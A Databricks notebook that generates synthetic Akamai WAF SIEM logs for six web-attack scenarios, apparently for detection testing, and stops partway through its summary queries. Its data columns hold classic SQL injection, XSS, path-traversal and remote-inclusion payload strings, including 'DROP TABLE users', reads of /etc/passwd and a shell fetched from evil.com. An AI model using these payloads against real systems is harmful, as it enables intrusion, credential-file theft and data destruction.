# Databricks notebook source
# MAGIC %md
# MAGIC # Akamai WAF Security Scenario Synthetic Data
# MAGIC
# MAGIC This notebook uses **[dbldatagen](https://databrickslabs.github.io/dbldatagen/)** to simulate
# MAGIC Akamai SIEM Integration API logs containing common web-attack patterns. The scenarios modelled here are:
# MAGIC
# MAGIC 1. **SQL Injection attacks** - malicious SQL payloads in query parameters and bodies.
# MAGIC 2. **Cross-Site Scripting (XSS) attacks** - reflected and stored script injection attempts.
# MAGIC 3. **Remote/Local File Inclusion (RFI/LFI)** - path traversal and remote file loads.
# MAGIC 4. **DDoS and rate limiting** - high-volume bursts from a small set of IPs.
# MAGIC 5. **Bot detection** - web scrapers, headless browsers, and automation tooling.
# MAGIC 6. **API abuse** - credential enumeration and anomalous API access patterns.
# MAGIC
# MAGIC Each scenario is saved as a Delta table and optionally exported to JSON, which you can
# MAGIC replay into a SIEM or any tool that ingests Akamai SIEM logs.

# COMMAND ----------

# MAGIC %pip install dbldatagen
# MAGIC %restart_python

# COMMAND ----------

# MAGIC %md
# MAGIC ## Configuration
# MAGIC
# MAGIC Set the following parameters using widgets at the top of the notebook:
# MAGIC
# MAGIC | Widget         | What it controls                                                         |
# MAGIC | -------------- | ------------------------------------------------------------------------ |
# MAGIC | `catalog_name` | Catalog where Delta tables are written                                   |
# MAGIC | `schema_name`  | Schema where Delta tables are written (tables are named `akamai_*`)      |
# MAGIC | `base_rows`    | Rows generated per scenario                                              |
# MAGIC | `partitions`   | Number of Spark partitions used when generating data                     |

# COMMAND ----------

dbutils.widgets.text("catalog_name", "main", "Catalog Name")
dbutils.widgets.text("schema_name", "datagen", "Schema Name")
dbutils.widgets.text("base_rows", "10000", "Rows per scenario")
dbutils.widgets.text("partitions", "4", "Spark partitions")

catalog_name = dbutils.widgets.get("catalog_name")
schema_name = dbutils.widgets.get("schema_name")
base_rows = int(dbutils.widgets.get("base_rows"))
partitions = int(dbutils.widgets.get("partitions"))

print(f"catalog_name: {catalog_name}")
print(f"schema_name:  {schema_name}")
print(f"base_rows:    {base_rows}")
print(f"partitions:   {partitions}")

# COMMAND ----------

from dbldatagen import DataGenerator
from pyspark.sql import DataFrame
from pyspark.sql.functions import col, struct, when, lit, expr

# COMMAND ----------

# MAGIC %md
# MAGIC ## Scenario 1: SQL injection attacks
# MAGIC
# MAGIC **Attack pattern:**
# MAGIC SQL injection attempts to escape out of query parameters and into the underlying query,
# MAGIC tacking on logical tautologies (`OR '1'='1'`), UNION SELECTs, or destructive DDL
# MAGIC (`DROP TABLE users`). Effective WAFs block the vast majority of these; the remaining
# MAGIC fraction escapes as alerts and is logged for investigation.
# MAGIC
# MAGIC **What this cell generates:**
# MAGIC ~85% `deny` outcomes, ~15% `alert`, six canonical SQLi payloads distributed across query
# MAGIC parameters on four hostnames, and an `sqlmap` user-agent mixed in to mimic automated tooling.

# COMMAND ----------

sql_injection_attack_logs = (
    DataGenerator(spark, rows=base_rows, partitions=partitions)
    .withColumn("type", "string", values=["akamai_siem"])
    .withColumn("format", "string", values=["json"])
    .withColumn("version", "string", values=["1.0"])
    .withColumn(
        "ipPrefix", "string",
        values=["203.0.113.", "198.51.100.", "45.33.32.", "185.220.101.", "192.168.1."],
        random=True, omit=True,
    )
    .withColumn(
        "clientIP", "string", baseColumn="ipPrefix",
        expr="concat(ipPrefix, cast(rand() * 254 + 1 as int))",
    )
    .withColumn("configId", "string", expr="concat('waf_config_', cast(rand() * 10000 + 10000 as int))")
    .withColumn("policyId", "string", expr="concat('sqli_policy_', cast(rand() * 100 as int))")
    # 85% denied by the WAF, 15% logged as alerts only.
    .withColumn("ruleActions", "string", values=["deny", "alert"], weights=[85, 15], random=True)
    .withColumn(
        "sqlPattern", "string",
        values=[
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin'--",
            "' OR '1'='1' /*",
        ],
        random=True, omit=True,
    )
    .withColumn(
        "ruleData", "string", baseColumn="sqlPattern",
        expr="concat('SQL Injection detected in query parameter: ', sqlPattern)",
    )
    .withColumn(
        "ruleMessages", "string", baseColumn="sqlPattern",
        expr="concat('Attack detected - SQL Injection pattern: ', sqlPattern)",
    )
    .withColumn("ruleTags", "string", values=["SQL_INJECTION/WEB_ATTACK/SQLI"])
    .withColumn("rules", "string", values=["950901", "981242", "981243", "981244"], random=True)
    .withColumn("method", "string", values=["GET", "POST", "PUT"], random=True)
    .withColumn(
        "host", "string",
        values=["api.example.com", "www.example.com", "shop.example.com", "admin.example.com"],
        random=True,
    )
    .withColumn(
        "path", "string",
        values=["/search", "/login", "/api/users", "/products", "/admin/dashboard"],
        random=True,
    )
    .withColumn(
        "query", "string", baseColumn="sqlPattern",
        expr="concat('q=', sqlPattern, '&page=1')",
    )
    .withColumn("protocol", "string", values=["HTTP/1.1", "HTTP/2"], random=True)
    # 403 when denied, occasional 500 (rule reached the backend), 200 for alerts.
    .withColumn(
        "status", "integer", baseColumn="ruleActions",
        expr="case when ruleActions = 'deny' then 403 when rand() < 0.3 then 500 else 200 end",
    )
    .withColumn("bytes", "integer", expr="cast(rand() * 5000 + 500 as int)")
    .withColumn(
        "userAgent", "string",
        values=[
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Python-urllib/3.8",
            "curl/7.68.0",
            "sqlmap/1.5",
        ],
        random=True,
    )
    .withColumn("eventTypeId", "string", values=["1001"])
    .withColumn("eventTypeName", "string", values=["SQL Injection"])
    .withColumn("eventName", "string", values=["SQL Injection Attack Detected"])
    .withColumn(
        "timestamp", "long",
        expr="cast((unix_timestamp(current_timestamp()) - cast(rand() * 3600 as int)) * 1000 as long)",
    )
).build()

display(sql_injection_attack_logs)

# COMMAND ----------

# MAGIC %md
# MAGIC ## Scenario 2: Cross-Site Scripting (XSS) attacks
# MAGIC
# MAGIC **Attack pattern:**
# MAGIC XSS tries to smuggle JavaScript through form fields, query parameters, or URL fragments so
# MAGIC that the resulting page executes attacker-controlled code in another user's browser.
# MAGIC Payloads range from plain `<script>` tags to obfuscated `onerror`/`onload` event handlers
# MAGIC on benign-looking HTML.
# MAGIC
# MAGIC **What this cell generates:**
# MAGIC ~80% `deny`, ~20% `alert`, six representative payloads spread across user-generated-content
# MAGIC endpoints (comments, profiles, posts, feedback, search).

# COMMAND ----------

xss_attack_logs = (
    DataGenerator(spark, rows=base_rows, partitions=partitions)
    .withColumn("type", "string", values=["akamai_siem"])
    .withColumn("format", "string", values=["json"])
    .withColumn("version", "string", values=["1.0"])
    .withColumn(
        "ipPrefix", "string",
        values=[
            "203.0.113.", "198.51.100.", "45.33.32.",
            "185.220.101.", "91.108.56.", "192.168.1.",
        ],
        random=True, omit=True,
    )
    .withColumn(
        "clientIP", "string", baseColumn="ipPrefix",
        expr="concat(ipPrefix, cast(rand() * 254 + 1 as int))",
    )
    .withColumn("configId", "string", expr="concat('waf_config_', cast(rand() * 10000 + 10000 as int))")
    .withColumn("policyId", "string", expr="concat('xss_policy_', cast(rand() * 100 as int))")
    .withColumn("ruleActions", "string", values=["deny", "alert"], weights=[80, 20], random=True)
    .withColumn(
        "xssPayload", "string",
        values=[
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
        ],
        random=True, omit=True,
    )
    .withColumn(
        "ruleData", "string", baseColumn="xssPayload",
        expr="concat('XSS attack detected in input: ', xssPayload)",
    )
    .withColumn(
        "ruleMessages", "string", baseColumn="xssPayload",
        expr="concat('Cross-Site Scripting attempt blocked: ', xssPayload)",
    )
    .withColumn("ruleTags", "string", values=["XSS/WEB_ATTACK/CROSS_SITE_SCRIPTING"])
    .withColumn("rules", "string", values=["941100", "941110", "941120", "941130"], random=True)
    .withColumn("method", "string", values=["GET", "POST", "PUT"], random=True)
    .withColumn(
        "host", "string",
        values=["www.example.com", "blog.example.com", "forum.example.com", "shop.example.com"],
        random=True,
    )
    .withColumn(
        "path", "string",
        values=["/comment", "/search", "/profile", "/post", "/feedback"],
        random=True,
    )
    .withColumn(
        "query", "string", baseColumn="xssPayload",
        expr="concat('input=', replace(xssPayload, ' ', '%20'))",
    )
    .withColumn("protocol", "string", values=["HTTP/1.1", "HTTP/2"], random=True)
    .withColumn(
        "status", "integer", baseColumn="ruleActions",
        expr="case when ruleActions = 'deny' then 403 else 200 end",
    )
    .withColumn("bytes", "integer", expr="cast(rand() * 3000 + 300 as int)")
    .withColumn(
        "userAgent", "string",
        values=[
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "curl/7.68.0",
        ],
        random=True,
    )
    .withColumn("eventTypeId", "string", values=["1002"])
    .withColumn("eventTypeName", "string", values=["Cross-Site Scripting"])
    .withColumn("eventName", "string", values=["XSS Attack Detected"])
    .withColumn(
        "timestamp", "long",
        expr="cast((unix_timestamp(current_timestamp()) - cast(rand() * 7200 as int)) * 1000 as long)",
    )
).build()

display(xss_attack_logs)

# COMMAND ----------

# MAGIC %md
# MAGIC ## Scenario 3: Remote/Local File Inclusion (RFI/LFI)
# MAGIC
# MAGIC **Attack pattern:**
# MAGIC File-inclusion attacks try to coax a server into reading files outside the web root
# MAGIC (`../../../../etc/passwd`, Windows SAM) or executing code loaded from a remote URL. They
# MAGIC usually target endpoints that take a filename or path as a parameter.
# MAGIC
# MAGIC **What this cell generates:**
# MAGIC ~90% `deny` (WAF rules for this class tend to be aggressive), six classic payloads, and
# MAGIC tooling user-agents (Python, curl, wget) that scanners prefer.

# COMMAND ----------

file_inclusion_attack_logs = (
    DataGenerator(spark, rows=base_rows, partitions=partitions)
    .withColumn("type", "string", values=["akamai_siem"])
    .withColumn("format", "string", values=["json"])
    .withColumn("version", "string", values=["1.0"])
    .withColumn(
        "ipPrefix", "string",
        values=["203.0.113.", "198.51.100.", "45.33.32.", "185.220.101.", "104.244.42."],
        random=True, omit=True,
    )
    .withColumn(
        "clientIP", "string", baseColumn="ipPrefix",
        expr="concat(ipPrefix, cast(rand() * 254 + 1 as int))",
    )
    .withColumn("configId", "string", expr="concat('waf_config_', cast(rand() * 10000 + 10000 as int))")
    .withColumn("policyId", "string", expr="concat('rfi_policy_', cast(rand() * 100 as int))")
    .withColumn("ruleActions", "string", values=["deny", "alert"], weights=[90, 10], random=True)
    .withColumn(
        "filePattern", "string",
        values=[
            "../../../../etc/passwd",
            "../../../../../../windows/system32/config/sam",
            "http://evil.com/shell.txt",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "....//....//....//etc/passwd",
        ],
        random=True, omit=True,
    )
    .withColumn(
        "ruleData", "string", baseColumn="filePattern",
        expr="concat('File Inclusion attack detected: ', filePattern)",
    )
    .withColumn(
        "ruleMessages", "string", baseColumn="filePattern",
        expr="concat('RFI/LFI attempt blocked - path traversal: ', filePattern)",
    )
    .withColumn("ruleTags", "string", values=["FILE_INCLUSION/RFI/LFI/PATH_TRAVERSAL"])
    .withColumn("rules", "string", values=["930100", "930110", "930120", "930130"], random=True)
    .withColumn("method", "string", values=["GET", "POST"], random=True)
    .withColumn("host", "string", values=["api.example.com", "www.example.com", "files.example.com"], random=True)
    .withColumn("path", "string", values=["/download", "/include", "/file", "/page"], random=True)
    .withColumn(
        "query", "string", baseColumn="filePattern",
        expr="concat('file=', replace(filePattern, '/', '%2F'))",
    )
    .withColumn("protocol", "string", values=["HTTP/1.1"])
    .withColumn(
        "status", "integer", baseColumn="ruleActions",
        expr="case when ruleActions = 'deny' then 403 else 500 end",
    )
    .withColumn("bytes", "integer", expr="cast(rand() * 2000 + 200 as int)")
    .withColumn(
        "userAgent", "string",
        values=["Python-urllib/3.8", "curl/7.68.0", "Wget/1.20.3"],
        random=True,
    )
    .withColumn("eventTypeId", "string", values=["1003"])
    .withColumn("eventTypeName", "string", values=["File Inclusion"])
    .withColumn("eventName", "string", values=["RFI/LFI Attack Detected"])
    .withColumn(
        "timestamp", "long",
        expr="cast((unix_timestamp(current_timestamp()) - cast(rand() * 1800 as int)) * 1000 as long)",
    )
).build()

display(file_inclusion_attack_logs)

# COMMAND ----------

# MAGIC %md
# MAGIC ## Scenario 4: DDoS and rate limiting
# MAGIC
# MAGIC **Attack pattern:**
# MAGIC Volumetric attacks concentrate a high request rate on a small number of source IPs,
# MAGIC overwhelming origin infrastructure or saturating bandwidth. Rate-limiting rules fire in
# MAGIC response and emit a burst of `429 Too Many Requests` responses before the traffic ever
# MAGIC reaches the backend.
# MAGIC
# MAGIC **What this cell generates:**
# MAGIC 90% of events come from four attacker IPs; ~95% hit rate-limit rules (status 429). Requests
# MAGIC target a handful of hot endpoints, which mimics a volumetric attack on a specific resource.

# COMMAND ----------

ddos_attacker_ips = ["203.0.113.10", "198.51.100.20", "45.33.32.30", "185.220.101.40"]
ddos_normal_prefixes = ["192.168.1."]

ddos_rate_limiting_logs = (
    DataGenerator(spark, rows=base_rows, partitions=partitions)
    .withColumn("type", "string", values=["akamai_siem"])
    .withColumn("format", "string", values=["json"])
    .withColumn("version", "string", values=["1.0"])
    .withColumn(
        "ipSource", "string",
        values=ddos_attacker_ips + ddos_normal_prefixes,
        weights=[23, 23, 23, 23, 10],
        random=True, omit=True,
    )
    .withColumn(
        "clientIP", "string", baseColumn="ipSource",
        expr="case when ipSource like '%.' then concat(ipSource, cast(rand() * 254 + 1 as int)) else ipSource end",
    )
    .withColumn("configId", "string", expr="concat('waf_config_', cast(rand() * 10000 + 10000 as int))")
    .withColumn("policyId", "string", expr="concat('rate_limit_policy_', cast(rand() * 50 as int))")
    .withColumn("ruleActions", "string", values=["rate_limit", "allow"], weights=[95, 5], random=True)
    .withColumn(
        "ruleData", "string",
        expr="concat('Rate limit exceeded - ', cast(rand() * 1000 + 1000 as int), ' requests/minute')",
    )
    .withColumn(
        "ruleMessages", "string", baseColumn="clientIP",
        expr="concat('Client ', clientIP, ' exceeded rate limit threshold')",
    )
    .withColumn("ruleTags", "string", values=["RATE_LIMIT/DDOS/BURST_TRAFFIC"])
    .withColumn("rules", "string", values=["RATE-LIMIT-001", "RATE-LIMIT-002"], random=True)
    .withColumn("method", "string", values=["GET", "POST", "HEAD", "OPTIONS"], random=True)
    .withColumn("host", "string", values=["api.example.com", "www.example.com"], random=True)
    .withColumn(
        "path", "string",
        values=["/api/v1/users", "/api/v1/products", "/search", "/", "/api/v1/orders"],
        random=True,
    )
    .withColumn("query", "string", expr="concat('page=', cast(rand() * 100 as int))")
    .withColumn("protocol", "string", values=["HTTP/1.1", "HTTP/2"], random=True)
    .withColumn(
        "status", "integer", baseColumn="ruleActions",
        expr="case when ruleActions = 'rate_limit' then 429 else 200 end",
    )
    .withColumn("bytes", "integer", expr="cast(rand() * 1000 + 100 as int)")
    .withColumn(
        "userAgent", "string",
        values=[
            "Mozilla/5.0 (compatible; bot/1.0)",
            "Python-requests/2.28.0",
            "Apache-HttpClient/4.5.13",
            "Go-http-client/1.1",
        ],
        random=True,
    )
    .withColumn("eventTypeId", "string", values=["1004"])
    .withColumn("eventTypeName", "string", values=["Rate Limiting"])
    .withColumn("eventName", "string", values=["Rate Limit Exceeded"])
    .withColumn(
        "timestamp", "long",
        expr="cast((unix_timestamp(current_timestamp()) - cast(rand() * 300 as int)) * 1000 as long)",
    )
).build()

display(ddos_rate_limiting_logs)

# COMMAND ----------

# MAGIC %md
# MAGIC ## Scenario 5: Bot detection
# MAGIC
# MAGIC **Attack pattern:**
# MAGIC Automated clients — scrapers, headless browsers, and traffic-inflating bots — identify
# MAGIC themselves through user-agent strings, predictable request cadence, or missing cookies.
# MAGIC WAFs catch many of these via signature matches; the rest are served a JavaScript
# MAGIC challenge (`429`).
# MAGIC
# MAGIC **What this cell generates:**
# MAGIC ~70% outright `deny`, ~30% `challenge`. Traffic targets catalog / price-scraping endpoints
# MAGIC that are common bot targets on e-commerce sites.

# COMMAND ----------

bot_detection_logs = (
    DataGenerator(spark, rows=base_rows, partitions=partitions)
    .withColumn("type", "string", values=["akamai_siem"])
    .withColumn("format", "string", values=["json"])
    .withColumn("version", "string", values=["1.0"])
    .withColumn(
        "ipPrefix", "string",
        values=["203.0.113.", "198.51.100.", "91.108.56.", "185.220.101.", "104.244.42."],
        random=True, omit=True,
    )
    .withColumn(
        "clientIP", "string", baseColumn="ipPrefix",
        expr="concat(ipPrefix, cast(rand() * 254 + 1 as int))",
    )
    .withColumn("configId", "string", expr="concat('waf_config_', cast(rand() * 10000 + 10000 as int))")
    .withColumn("policyId", "string", expr="concat('bot_policy_', cast(rand() * 100 as int))")
    .withColumn("ruleActions", "string", values=["deny", "challenge"], weights=[70, 30], random=True)
    .withColumn(
        "botUserAgent", "string",
        values=[
            "scrapy-bot/1.0",
            "python-requests/2.28.0",
            "Selenium/4.0",
            "PhantomJS/2.1.1",
            "HeadlessChrome/96.0",
            "curl/7.68.0",
        ],
        random=True, omit=True,
    )
    .withColumn(
        "ruleData", "string", baseColumn="botUserAgent",
        expr="concat('Malicious bot detected - User-Agent: ', botUserAgent)",
    )
    .withColumn(
        "ruleMessages", "string", baseColumn="botUserAgent",
        expr="concat('Bot signature matched: ', botUserAgent, ' - Blocking automated traffic')",
    )
    .withColumn("ruleTags", "string", values=["BOT_DETECTION/AUTOMATED_TRAFFIC/WEB_SCRAPING"])
    .withColumn("rules", "string", values=["BOT-001", "BOT-002", "BOT-003"], random=True)
    .withColumn("method", "string", values=["GET", "POST"], random=True)
    .withColumn("host", "string", values=["www.example.com", "shop.example.com", "api.example.com"], random=True)
    .withColumn(
        "path", "string",
        values=["/products", "/search", "/api/catalog", "/prices", "/inventory", "/sitemap.xml"],
        random=True,
    )
    .withColumn("query", "string", expr="concat('page=', cast(rand() * 1000 as int))")
    .withColumn("protocol", "string", values=["HTTP/1.1", "HTTP/2"], random=True)
    .withColumn(
        "status", "integer", baseColumn="ruleActions",
        expr="case ruleActions when 'deny' then 403 when 'challenge' then 429 else 200 end",
    )
    .withColumn("bytes", "integer", expr="cast(rand() * 8000 + 500 as int)")
    # The request's user-agent header is the bot signature we classified on.
    .withColumn("userAgent", "string", baseColumn="botUserAgent", expr="botUserAgent")
    .withColumn("eventTypeId", "string", values=["1005"])
    .withColumn("eventTypeName", "string", values=["Bot Detection"])
    .withColumn("eventName", "string", values=["Malicious Bot Detected"])
    .withColumn(
        "timestamp", "long",
        expr="cast((unix_timestamp(current_timestamp()) - cast(rand() * 900 as int)) * 1000 as long)",
    )
).build()

display(bot_detection_logs)

# COMMAND ----------

# MAGIC %md
# MAGIC ## Scenario 6: API abuse and anomalous requests
# MAGIC
# MAGIC **Attack pattern:**
# MAGIC API abuse covers a grab bag: scripts that enumerate user IDs, clients reusing stolen API
# MAGIC keys, attackers probing endpoints for misconfigured authorization. These usually hit
# MAGIC `/api/*` paths and carry tool-style user agents (Postman, Insomnia, `axios`, `requests`).
# MAGIC
# MAGIC **What this cell generates:**
# MAGIC ~75% `deny`. Five canonical abuse categories distributed across auth, user, token, and
# MAGIC admin endpoints.

# COMMAND ----------

api_abuse_logs = (
    DataGenerator(spark, rows=base_rows, partitions=partitions)
    .withColumn("type", "string", values=["akamai_siem"])
    .withColumn("format", "string", values=["json"])
    .withColumn("version", "string", values=["1.0"])
    .withColumn(
        "ipPrefix", "string",
        values=[
            "203.0.113.", "198.51.100.", "45.33.32.",
            "91.108.56.", "185.220.101.", "192.168.1.",
        ],
        random=True, omit=True,
    )
    .withColumn(
        "clientIP", "string", baseColumn="ipPrefix",
        expr="concat(ipPrefix, cast(rand() * 254 + 1 as int))",
    )
    .withColumn("configId", "string", expr="concat('waf_config_', cast(rand() * 10000 + 10000 as int))")
    .withColumn("policyId", "string", expr="concat('api_abuse_policy_', cast(rand() * 50 as int))")
    .withColumn("ruleActions", "string", values=["deny", "alert"], weights=[75, 25], random=True)
    .withColumn(
        "apiAbuse", "string",
        values=[
            "Excessive API calls - credential enumeration",
            "Invalid API key usage pattern",
            "Suspicious parameter manipulation",
            "API endpoint scanning",
            "Unauthorized API access attempt",
        ],
        random=True,
    )
    .withColumn("ruleData", "string", baseColumn="apiAbuse", expr="apiAbuse")
    .withColumn(
        "ruleMessages", "string", baseColumn="apiAbuse",
        expr="concat('API abuse detected: ', apiAbuse)",
    )
    .withColumn("ruleTags", "string", values=["API_ABUSE/CREDENTIAL_STUFFING/ENUMERATION"])
    .withColumn("rules", "string", values=["API-001", "API-002", "API-003"], random=True)
    .withColumn("method", "string", values=["POST", "GET", "PUT", "DELETE"], random=True)
    .withColumn("host", "string", values=["api.example.com", "api-v2.example.com", "rest.example.com"], random=True)
    .withColumn(
        "path", "string",
        values=[
            "/api/v1/auth/login", "/api/v1/users", "/api/v1/accounts",
            "/api/v2/payment", "/api/v1/admin", "/api/v1/tokens", "/api/v1/data",
        ],
        random=True,
    )
    .withColumn(
        "query", "string",
        expr="concat('apikey=', substring(md5(cast(rand() as string)), 1, 16))",
    )
    .withColumn("protocol", "string", values=["HTTP/1.1", "HTTP/2"], random=True)
    # 401/403/429 when denied (credential, permission, and rate-limit failures respectively),
    # 200 otherwise.
    .withColumn(
        "status", "integer", baseColumn="ruleActions",
        expr="case when ruleActions = 'deny' then element_at(array(401, 403, 429), cast(rand() * 3 as int) + 1) else 200 end",
    )
    .withColumn("bytes", "integer", expr="cast(rand() * 3000 + 200 as int)")
    .withColumn(
        "userAgent", "string",
        values=[
            "PostmanRuntime/7.29.0",
            "insomnia/2022.7.0",
            "Python-requests/2.28.0",
            "curl/7.68.0",
            "axios/0.27.2",
        ],
        random=True,
    )
    .withColumn("eventTypeId", "string", values=["1006"])
    .withColumn("eventTypeName", "string", values=["API Abuse"])
    .withColumn("eventName", "string", values=["API Abuse Pattern Detected"])
    .withColumn(
        "timestamp", "long",
        expr="cast((unix_timestamp(current_timestamp()) - cast(rand() * 1200 as int)) * 1000 as long)",
    )
).build()

display(api_abuse_logs)

# COMMAND ----------

# MAGIC %md
# MAGIC ## Wrap each scenario in the Akamai SIEM envelope
# MAGIC
# MAGIC Real Akamai SIEM records nest the raw columns into `attackData`, `httpMessage`, `eventType`,
# MAGIC and `geo` structs. The helper below performs a geolocation join (so every record carries
# MAGIC ASN / city / country) and then projects the final SIEM shape on top of the flat generated
# MAGIC columns. The lookup itself is a small static table built here - the locations are fictitious
# MAGIC ("Region Alpha" benign; "Region Beta" / "Region Gamma" suspicious) so the notebook runs
# MAGIC anywhere without a real GeoIP dataset.

# COMMAND ----------

attack_geo_locations = [
    # (ip_pattern,         asn,      city,            country, regionCode, risk_category)
    # Normal - legitimate internal traffic
    ("192.168.1.*",        "11734",  "Northport",     "ZZ",    "NP",       "normal"),
    ("10.0.0.*",           "7922",   "Westbridge",    "ZZ",    "WB",       "normal"),
    ("172.16.0.*",         "20940",  "Centralview",   "ZZ",    "CV",       "normal"),
    # Suspicious - commonly-seen attack source ranges in real threat intel
    ("203.0.113.*",        "12876",  "Shadowmere",    "XX",    "SM",       "suspicious"),
    ("198.51.100.*",       "4134",   "Darkwater",     "XX",    "DW",       "suspicious"),
    ("45.33.32.*",         "24940",  "Greystone",     "XX",    "GS",       "suspicious"),
    ("185.220.101.*",      "63023",  "Phantom Bay",   "XX",    "PB",       "suspicious"),
    ("91.108.56.*",        "15895",  "Nebula City",   "XX",    "NC",       "suspicious"),
    ("104.244.42.*",       "29465",  "Voidhaven",     "XX",    "VH",       "suspicious"),
]

geo_df = spark.createDataFrame(
    attack_geo_locations,
    ["ip_pattern", "asn", "city", "country", "regionCode", "risk_category"],
)
geo_df.createOrReplaceTempView("akamai_geolocation")

display(geo_df)

# COMMAND ----------


def add_akamai_structs(df: DataFrame) -> DataFrame:
    """Attaches geolocation data and wraps the flat generated columns in Akamai SIEM's nested shape."""
    df_with_geo = (
        df
        .withColumn(
            "ip_prefix",
            expr(
                "concat(split(clientIP, '\\\\.')[0], '.', "
                "split(clientIP, '\\\\.')[1], '.', "
                "split(clientIP, '\\\\.')[2], '.*')"
            ),
        )
        .join(spark.table("akamai_geolocation"), col("ip_prefix") == col("ip_pattern"), "left")
        .drop("ip_prefix", "ip_pattern", "risk_category")
    )
    return df_with_geo.select(
        col("type"),
        col("format"),
        col("version"),
        struct(
            col("clientIP"),
            col("configId"),
            col("policyId"),
            col("ruleActions"),
            col("ruleData"),
            col("ruleMessages"),
            col("ruleTags"),
            col("rules"),
        ).alias("attackData"),
        when(
            col("asn").isNotNull(),
            struct(col("asn"), col("city"), col("country"), col("regionCode")),
        ).alias("geo"),
        struct(
            col("method"),
            col("host"),
            col("path"),
            col("query"),
            col("protocol"),
            col("status").cast("string").alias("status"),
            col("bytes").cast("string").alias("bytes"),
            col("userAgent"),
        ).alias("httpMessage"),
        struct(
            col("eventTypeId"),
            col("eventTypeName"),
            col("eventName"),
        ).alias("eventType"),
        col("timestamp"),
    )


# COMMAND ----------

sql_injection_with_structs = add_akamai_structs(sql_injection_attack_logs)
xss_attack_with_structs = add_akamai_structs(xss_attack_logs)
file_inclusion_with_structs = add_akamai_structs(file_inclusion_attack_logs)
ddos_rate_limiting_with_structs = add_akamai_structs(ddos_rate_limiting_logs)
bot_detection_with_structs = add_akamai_structs(bot_detection_logs)
api_abuse_with_structs = add_akamai_structs(api_abuse_logs)

# COMMAND ----------

# MAGIC %md
# MAGIC ## Save each dataset to a Delta table

# COMMAND ----------

spark.sql(f"CREATE SCHEMA IF NOT EXISTS {catalog_name}.{schema_name}")

# COMMAND ----------

# Scenario 1: SQL injection attacks
(
    sql_injection_with_structs
    .write
    .format("delta")
    .mode("overwrite")
    .option("overwriteSchema", "true")
    .saveAsTable(f"{catalog_name}.{schema_name}.akamai_sql_injection")
)

# COMMAND ----------

# Scenario 2: cross-site scripting
(
    xss_attack_with_structs
    .write
    .format("delta")
    .mode("overwrite")
    .option("overwriteSchema", "true")
    .saveAsTable(f"{catalog_name}.{schema_name}.akamai_xss")
)

# COMMAND ----------

# Scenario 3: file inclusion
(
    file_inclusion_with_structs
    .write
    .format("delta")
    .mode("overwrite")
    .option("overwriteSchema", "true")
    .saveAsTable(f"{catalog_name}.{schema_name}.akamai_file_inclusion")
)

# COMMAND ----------

# Scenario 4: DDoS / rate limiting
(
    ddos_rate_limiting_with_structs
    .write
    .format("delta")
    .mode("overwrite")
    .option("overwriteSchema", "true")
    .saveAsTable(f"{catalog_name}.{schema_name}.akamai_ddos_rate_limit")
)

# COMMAND ----------

# Scenario 5: bot detection
(
    bot_detection_with_structs
    .write
    .format("delta")
    .mode("overwrite")
    .option("overwriteSchema", "true")
    .saveAsTable(f"{catalog_name}.{schema_name}.akamai_bot_detection")
)

# COMMAND ----------

# Scenario 6: API abuse
(
    api_abuse_with_structs
    .write
    .format("delta")
    .mode("overwrite")
    .option("overwriteSchema", "true")
    .saveAsTable(f"{catalog_name}.{schema_name}.akamai_api_abuse")
)

# COMMAND ----------

# MAGIC %md
# MAGIC ## Summary statistics
# MAGIC
# MAGIC One SQL roll-up per scenario so you can eyeball that the intended proportions
# MAGIC (85% SQLi deny rate, 95% rate limited, etc.) actually showed up in the generated data.

# COMMAND ----------

# Scenario 1: SQL injection
display(spark.sql(f"""
  SELECT
    'SQL Injection' AS scenario,
    COUNT(*) AS total_records,
    COUNT(DISTINCT attackData.clientIP) AS unique_ips,
    SUM(CASE WHEN attackData.ruleActions = 'deny' THEN 1 ELSE 0 END) AS blocked,
    ROUND(100.0 * SUM(CASE WHEN attackData.ruleActions = 'deny' THEN 1 ELSE 0 END) / COUNT(*), 2) AS block_rate_pct
  FROM {catalog_name}.{schema_name}.akamai_sql_injection
"""))

# COMMAND ----------

# Scenario 2: cross-site scripting
display(spark.sql(f"""
  SELECT
    'Cross-Site Scripting' AS scenario,
    COUNT(*) AS total_records,
    COUNT(DISTINCT attackData.clientIP) AS unique_ips,
    SUM(CASE WHEN attackData.ruleActions = 'deny' THEN 1 ELSE 0 END) AS blocked,
    ROUND(100.0 * SUM(CASE WHEN attackData.ruleActions = 'deny' THEN 1 ELSE 0 END) / COUNT(*), 2) AS block_rate_pct
  FROM {catalog_name}.{schema_name}.akamai_xss
"""))

# COMMAND ----------

# Scenario 3: file inclusion
display(spark.sql(f"""
  SELECT
    'File Inclusion (RFI/LFI)' AS scenario,
    COUNT(*) AS total_records,
    COUNT(DISTINCT attackData.clientIP) AS unique_ips,
    SUM(CASE WHEN attackData.ruleActions = 'deny' THEN 1 ELSE 0 END) AS blocked,
    ROUND(100.0 * SUM(CASE WHEN attackData.ruleActions = 'deny' THEN 1 ELSE 0 END) / COUNT(*), 2) AS block_rate_pct
  FROM {catalog_name}.{schema_name}.akamai_file_inclusion
"""))

# COMMAND ----------

# Scenario 4: DDoS / rate limiting
display(spark.sql(f"""
  SELECT
    'DDoS / Rate Limiting' AS scenario,
    COUNT(*) AS total_records,
    COUNT(DISTINCT attackData.clientIP) AS unique_ips,
    SUM(CASE WHEN attackData.ruleActions = 'rate_limit' THEN 1 ELSE 0 END) AS rate_limited,
    ROUND(100.0 * SUM(CASE WHEN attackData.ruleActions = 'rate_limit' THEN 1 ELSE 0 END) / COUNT(*), 2) AS rate_limit_pct
  FROM {catalog_name}.{schema_name}.akamai_ddos_rate_limit
"""))

# COMMAND ----------

# Scenario 5: bot detection
display(spark.sql(f"""
  SELECT
    'Bot Detection' AS scenario,
    COUNT(*) AS total_records,
    COUNT(DISTINCT attackData.clientIP) AS unique_ips,
    SUM(CASE WHEN attackData.ruleActions = 'deny' THEN 1 ELSE 0 END) AS blocked,
    ROUND(100.0 * SUM(CASE WHEN attackData.ruleActions = 'deny' THEN 1 ELSE 0 END) / COUNT(*), 2) AS block_rate_pct
